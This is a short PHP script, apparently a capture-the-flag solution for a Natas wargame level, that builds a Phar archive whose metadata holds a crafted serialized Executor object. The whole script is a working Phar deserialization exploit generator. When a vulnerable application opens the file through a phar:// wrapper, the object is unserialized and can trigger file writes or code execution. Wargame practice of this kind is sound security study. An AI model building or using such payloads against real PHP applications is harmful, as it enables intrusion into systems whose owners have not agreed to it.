<?php
    // graz XeR, the first to solve it! thanks for the feedback!
    // ~morla
    class Executor{
        private $filename="test.php"; 
        private $signature='adeafbadbabec0dedabada55ba55d00d';
        private $init=False;
    }
    // create new Phar
    $phar = new Phar('natas.phar');
    $phar->startBuffering();
    $phar->addFromString('natas.txt', 'text');
    $phar->setStub('<?php __HALT_COMPILER(); ? >');
    // add object of any class as meta data
    class AnyClass {}
    $object = new Executor();
    $object->data = 'rips';
    $phar->setMetadata($object);
    $phar->stopBuffering();
    
?>